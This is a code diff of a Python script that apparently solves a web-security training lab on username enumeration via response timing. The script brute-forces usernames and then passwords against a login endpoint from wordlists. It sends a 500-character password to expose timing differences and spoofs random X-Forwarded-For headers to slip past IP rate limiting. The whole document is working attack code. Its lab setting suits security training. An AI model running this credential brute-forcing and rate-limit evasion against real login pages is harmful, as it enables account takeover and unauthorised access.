@@ -5,13 +5,15 @@
 import datetime
 import random
 import requests
+import shutil
 import sys
+import time
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 
-def login(url, username, password):
+def login(client, url, username, password):
     """Atempt to login.
     Return values:
       False on any condition not mentioned below
@@ -21,7 +23,7 @@ def login(url, username, password):
     headers = {'X-Forwarded-For': f'ABC{random.getrandbits(50)}'}
     data = {'username': username, 'password': password}
 
-    r = requests.post(url, headers=headers, data=data, allow_redirects=False, verify=False, proxies=proxies)
+    r = client.post(url, headers=headers, data=data, allow_redirects=False, verify=False, proxies=proxies)
 
     if r.status_code == 302:
         return 3
@@ -32,35 +34,35 @@ def login(url, username, password):
     return False
 
 
-def enumerate_username(url, username_filename):
+def enumerate_username(client, url, username_filename):
     with open(username_filename, 'r') as infile:
         for line in infile:
             username = line.rstrip()
-            if login(url, username, 'X' * 500) == 2:
+            msg = f'[ ] Brute force username: {username}'
+            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
+            if login(client, url, username, 'X' * 500) == 2:
+                msg = f'[+] Username found: {username}'
+                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                 return username
 
     return False
 
 
-def enumerate_password(url, username, passwords_filename):
+def enumerate_password(client, url, username, passwords_filename):
     with open(passwords_filename, 'r') as infile:
         for line in infile:
             password = line.rstrip()
-            if login(url, username, password) == 3:
+            msg = f'[ ] Brute force password: {password}'
+            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
+            if login(client, url, username, password) == 3:
+                msg = f'[+] Password found: {password}'
+                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                 return password
     return False
 
 
-def verify_login(url, username, password):
-    data = {'username': username, 'password': password}
-    headers = {'X-Forwarded-For': f'ABC{random.getrandbits(50)}'}
-    r = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
-    if 'Congratulations, you solved the lab!' in r.text:
-        return True
-    return False
-
-
 def main():
+    print('[+] Username enumeration via response timing')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
@@ -68,25 +70,26 @@ def main():
         print(f'Exampe: {sys.argv[0]} http://www.example.com')
         sys.exit(-1)
 
-    print(f'[ ] Brute force username and password')
+    client = requests.Session()
+    client.verify = False
+    client.proxies = proxies
 
     url = f'{host}/login'
-    username = enumerate_username(f'{url}', '../candidate_usernames.txt')
+    username = enumerate_username(client, f'{url}', '../candidate_usernames.txt')
     if not username:
         print(f'[-] Failed to enumerate username')
         sys.exit(-2)
-    print(f'[+] Found username: {username}')
 
-    password = enumerate_password(f'{url}', username, '../candidate_passwords.txt')
+    password = enumerate_password(client, f'{url}', username, '../candidate_passwords.txt')
     if not password:
         print(f'[-] Failed to enumerate password')
         sys.exit(-3)
-    print(f'[+] Found password: {password}')
 
-    if verify_login(url, username, password):
-        print(f'[+] Login successful, lab solved')
-    else:
-        print(f'[+] Login not successful')
+    if 'Your username is:' not in client.get(f'{host}/my-account').text:
+        print(f'[-] Failed to solve lab')
+        sys.exit(-9)
+
+    print(f'[+] Lab solved')
 
 
 if __name__ == "__main__":
